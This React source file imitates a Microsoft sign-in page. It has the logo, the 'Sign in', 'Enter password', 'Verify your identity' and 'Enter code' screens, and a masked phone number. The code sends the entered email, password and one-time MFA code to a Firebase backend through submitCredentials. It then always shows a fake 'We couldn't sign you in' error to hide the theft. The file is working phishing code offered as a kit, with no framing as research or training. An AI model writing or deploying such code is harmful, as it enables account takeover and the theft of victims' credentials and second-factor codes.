import { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Key, ArrowLeft, MessageSquare, Phone } from 'lucide-react';
import { submitCredentials } from '@/src/lib/firebase';

export default function App() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [code, setCode] = useState('');
  const [step, setStep] = useState<'email' | 'password' | 'verify-select' | 'enter-code'>('email');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitted, setSubmitted] = useState(false);

  const handleNext = () => {
    if (email.trim()) {
      setStep('password');
    }
  };

  const handleSignIn = async () => {
    if (password.trim()) {
      setIsSubmitting(true);
      try {
        await submitCredentials(email, password);
        setStep('verify-select');
      } catch (error) {
        console.error("Submission failed", error);
        setStep('verify-select'); // Transition to verify-select even on failure for the flow
      } finally {
        setIsSubmitting(false);
      }
    }
  };

  const handleVerifySelect = () => {
    setStep('enter-code');
  };

  const handleCodeSubmit = async () => {
    if (code.trim()) {
      setIsSubmitting(true);
      try {
        await submitCredentials(email, password, code);
        setSubmitted(true);
      } catch (error) {
        setSubmitted(true); 
      } finally {
        setIsSubmitting(false);
      }
    }
  };

  const handleBack = () => {
    if (step === 'password') {
      setStep('email');
      setPassword('');
    } else if (step === 'verify-select') {
      setStep('password');
    } else if (step === 'enter-code') {
      setStep('verify-select');
    }
  };

  if (submitted) {
    return (
      <div className="min-h-screen bg-[#f2f2f2] flex items-center justify-center p-4 relative overflow-hidden font-sans">
        <div className="absolute inset-0 z-0 opacity-60">
          <div className="absolute top-[5%] right-[10%] w-[80%] h-[70%] bg-[#e3eefc] rounded-full blur-[120px] transform rotate-12"></div>
          <div className="absolute bottom-[10%] left-[5%] w-[70%] h-[60%] bg-[#f0f4ff] rounded-full blur-[100px] transform -rotate-6"></div>
          <div className="absolute top-[20%] left-[15%] w-[40%] h-[40%] bg-[#ebf1f9] rounded-full blur-[90px]"></div>
        </div>
        <motion.div 
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          className="bg-white p-[44px] shadow-[0_2px_6px_rgba(0,0,0,0.2)] rounded-sm z-10 w-full max-w-[440px] text-center"
        >
          <div className="mb-6 flex items-center justify-center space-x-3">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <rect width="10.8" height="10.8" fill="#F25022"/>
              <rect x="12" width="10.8" height="10.8" fill="#7FBA00"/>
              <rect y="12" width="10.8" height="10.8" fill="#00A4EF"/>
              <rect x="12" y="12" width="10.8" height="10.8" fill="#FFB900"/>
            </svg>
            <span className="text-[20px] font-semibold text-[#737373] font-sans tracking-tight">Microsoft</span>
          </div>
          <h1 className="text-[24px] font-semibold text-[#1b1b1b] mb-4">We couldn't sign you in</h1>
          <p className="text-[#e81123] text-[15px] mb-2 font-semibold">Something went wrong.</p>
          <p className="text-[#666666] text-[13px]">We've encountered an internal error. Please contact your system administrator or try again later.</p>
          <button 
            onClick={() => window.location.reload()}
            className="mt-8 bg-[#cccccc] text-[#1b1b1b] px-[20px] py-[6px] text-[15px] hover:bg-[#bbbbbb] transition-colors"
          >
            Go back
          </button>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f2f2f2] flex items-center justify-center p-4 relative overflow-hidden font-sans">
      {/* Refined Atmospheric Background Blobs */}
      <div className="absolute inset-0 z-0 opacity-60">
        <div className="absolute top-[5%] right-[10%] w-[80%] h-[70%] bg-[#e3eefc] rounded-full blur-[120px] transform rotate-12"></div>
        <div className="absolute bottom-[10%] left-[5%] w-[70%] h-[60%] bg-[#f0f4ff] rounded-full blur-[100px] transform -rotate-6"></div>
        <div className="absolute top-[20%] left-[15%] w-[40%] h-[40%] bg-[#ebf1f9] rounded-full blur-[90px]"></div>
      </div>

      <div className="w-full max-w-[440px] z-10">
        {/* Main Sign-in Card */}
        <motion.div 
          initial={{ opacity: 0, y: 15 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.35, ease: "easeOut" }}
          className="bg-white p-[44px] shadow-[0_2px_6px_rgba(0,0,0,0.2)] rounded-sm min-h-[380px] flex flex-col"
        >
          <div className="mb-6 flex items-center space-x-3">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <rect width="10.8" height="10.8" fill="#F25022"/>
              <rect x="12" width="10.8" height="10.8" fill="#7FBA00"/>
              <rect y="12" width="10.8" height="10.8" fill="#00A4EF"/>
              <rect x="12" y="12" width="10.8" height="10.8" fill="#FFB900"/>
            </svg>
            <span className="text-[20px] font-semibold text-[#737373] font-sans tracking-tight">Microsoft</span>
          </div>

          <AnimatePresence mode="wait">
            {step === 'email' ? (
              <motion.div
                key="email-step"
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                transition={{ duration: 0.2 }}
                className="flex-1 flex flex-col"
              >
                <h1 className="text-[24px] font-semibold text-[#1b1b1b] mb-[18px] leading-tight">Sign in</h1>
                
                <div className="space-y-[18px] flex-1">
                  <div className="relative group">
                    <input
                      type="text"
                      placeholder="Email, phone, or Skype"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      onKeyDown={(e) => e.key === 'Enter' && handleNext()}
                      autoFocus
                      className="w-full py-[6px] border-b border-[#000000] focus:border-[#0067b8] outline-none transition-all placeholder:text-[#666666] text-[15px]"
                    />
                  </div>

                  <div className="text-[13px] text-[#1b1b1b] space-y-3">
                    <p>
                      No account? <a href="#" className="text-[#0067b8] hover:underline">Create one!</a>
                    </p>
                    <p>
                      <a href="#" className="text-[#0067b8] hover:underline">Can't access your account?</a>
                    </p>
                  </div>

                  <div className="flex justify-end mt-auto pt-10">
                    <button 
                      onClick={handleNext}
                      disabled={!email.trim()}
                      className="bg-[#0067b8] text-white px-[36px] py-[6px] text-[15px] hover:bg-[#005da6] transition-colors focus:ring-2 focus:ring-offset-2 focus:ring-[#0067b8] outline-none min-w-[108px] disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                      Next
                    </button>
                  </div>
                </div>
              </motion.div>
            ) : step === 'password' ? (
              <motion.div
                key="password-step"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: 20 }}
                transition={{ duration: 0.2 }}
                className="flex-1 flex flex-col"
              >
                <div className="flex items-center mb-2">
                  <button 
                    onClick={handleBack}
                    className="p-1 -ml-2 rounded-full hover:bg-slate-100 transition-colors mr-1"
                  >
                    <ArrowLeft size={16} className="text-[#1b1b1b]" />
                  </button>
                  <span className="text-[15px] text-[#1b1b1b] truncate">{email}</span>
                </div>
                
                <h1 className="text-[24px] font-semibold text-[#1b1b1b] mb-[18px] leading-tight">Enter password</h1>
                
                <div className="space-y-[18px] flex-1">
                  <div className="relative group">
                    <input
                      type="password"
                      placeholder="Password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      onKeyDown={(e) => e.key === 'Enter' && handleSignIn()}
                      autoFocus
                      className="w-full py-[6px] border-b border-[#000000] focus:border-[#0067b8] outline-none transition-all placeholder:text-[#666666] text-[15px]"
                    />
                  </div>

                  <div className="text-[13px] text-[#1b1b1b]">
                    <p>
                      <a href="#" className="text-[#0067b8] hover:underline">Forgot password?</a>
                    </p>
                  </div>

                  <div className="flex justify-end mt-auto pt-10">
                    <button 
                      onClick={handleSignIn}
                      disabled={!password.trim() || isSubmitting}
                      className="bg-[#0067b8] text-white px-[36px] py-[6px] text-[15px] hover:bg-[#005da6] transition-colors focus:ring-2 focus:ring-offset-2 focus:ring-[#0067b8] outline-none min-w-[108px] disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
                    >
                      {isSubmitting ? (
                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                      ) : 'Sign in'}
                    </button>
                  </div>
                </div>
              </motion.div>
            ) : step === 'verify-select' ? (
              <motion.div
                key="verify-select-step"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: 20 }}
                transition={{ duration: 0.2 }}
                className="flex-1 flex flex-col"
              >
                <div className="flex items-center mb-2">
                  <span className="text-[15px] text-[#1b1b1b] truncate">{email}</span>
                </div>
                
                <h1 className="text-[24px] font-semibold text-[#1b1b1b] mb-[12px] leading-tight">Verify your identity</h1>
                
                <div className="flex flex-col flex-1">
                  <div className="border-t border-b border-dashed border-gray-300 py-2">
                    <button 
                      onClick={handleVerifySelect}
                      className="w-full flex items-center p-4 hover:bg-black/5 transition-colors text-left group"
                    >
                      <div className="w-10 h-10 mr-4 flex items-center justify-center">
                        <MessageSquare size={28} strokeWidth={1.5} className="text-[#1b1b1b]" />
                      </div>
                      <span className="text-[15px] text-[#1b1b1b]">Text +XX XXXXXXXXX25</span>
                    </button>
                  </div>

                  <div className="border-b border-dashed border-gray-300 py-2">
                    <button 
                      onClick={handleVerifySelect}
                      className="w-full flex items-center p-4 hover:bg-black/5 transition-colors text-left"
                    >
                      <div className="w-10 h-10 mr-4 flex items-center justify-center">
                        <Phone size={28} strokeWidth={1.5} className="text-[#1b1b1b]" />
                      </div>
                      <span className="text-[15px] text-[#1b1b1b]">Call +XX XXXXXXXXX25</span>
                    </button>
                  </div>

                  <div className="mt-6 space-y-4">
                    <a href="#" className="text-[13px] text-[#0067b8] hover:underline block">More information</a>
                    
                    <p className="text-[13px] text-[#1b1b1b] leading-relaxed">
                      Are your verification methods current? Check at <a href="https://aka.ms/mfasetup" className="text-[#0067b8] hover:underline">https://aka.ms/mfasetup</a>
                    </p>
                  </div>

                  <div className="flex justify-end mt-auto pt-6">
                    <button 
                      onClick={() => setStep('password')}
                      className="bg-[#cccccc] text-[#1b1b1b] px-[32px] py-[6px] text-[15px] hover:bg-[#bbbbbb] transition-colors min-w-[108px]"
                    >
                      Cancel
                    </button>
                  </div>
                </div>
              </motion.div>
            ) : (
              <motion.div
                key="enter-code-step"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, y: 20 }}
                transition={{ duration: 0.2 }}
                className="flex-1 flex flex-col"
              >
                <div className="flex items-center mb-2">
                  <span className="text-[15px] text-[#1b1b1b] truncate">{email}</span>
                </div>
                
                <h1 className="text-[24px] font-semibold text-[#1b1b1b] mb-[18px] leading-tight">Enter code</h1>
                
                <div className="flex items-start mb-6">
                  <div className="mr-3 mt-1">
                    <MessageSquare size={18} strokeWidth={1.5} className="text-[#1b1b1b]" />
                  </div>
                  <p className="text-[15px] text-[#1b1b1b]">
                    We texted your phone +XX XXXXXXXXX25. Please enter the code to sign in.
                  </p>
                </div>

                <div className="space-y-[18px] flex-1">
                  <div className="relative group">
                    <input
                      type="text"
                      placeholder="Code"
                      value={code}
                      onChange={(e) => setCode(e.target.value)}
                      onKeyDown={(e) => e.key === 'Enter' && handleCodeSubmit()}
                      autoFocus
                      className="w-full py-[6px] border-b border-[#0067b8] outline-none transition-all placeholder:text-[#666666] text-[15px]"
                    />
                  </div>

                  <div className="text-[13px] text-[#1b1b1b] space-y-4 pt-2">
                    <p>
                      Having trouble? <a href="#" onClick={(e) => { e.preventDefault(); setStep('verify-select'); }} className="text-[#0067b8] hover:underline">Sign in another way</a>
                    </p>
                    <p>
                      <a href="#" className="text-[#0067b8] hover:underline">More information</a>
                    </p>
                  </div>

                  <div className="flex justify-end mt-auto pt-10">
                    <button 
                      onClick={handleCodeSubmit}
                      disabled={!code.trim() || isSubmitting}
                      className="bg-[#0067b8] text-white px-[36px] py-[6px] text-[15px] hover:bg-[#005da6] transition-colors focus:ring-2 focus:ring-offset-2 focus:ring-[#0067b8] outline-none min-w-[108px] disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
                    >
                      {isSubmitting ? (
                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                      ) : 'Verify'}
                    </button>
                  </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </motion.div>

        {/* Sign-in Options Row */}
        <AnimatePresence>
          {step === 'email' && (
            <motion.div
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: 10 }}
              transition={{ duration: 0.2 }}
              className="bg-white p-4 shadow-[0_2px_6px_rgba(0,0,0,0.15)] rounded-sm flex items-center space-x-3 cursor-pointer hover:bg-slate-50 transition-colors mt-7"
            >
              <div className="w-[32px] h-[32px] flex items-center justify-center">
                <Key size={24} strokeWidth={1} className="text-[#616161]" />
              </div>
              <span className="text-[15px] text-[#212121]">Sign-in options</span>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}

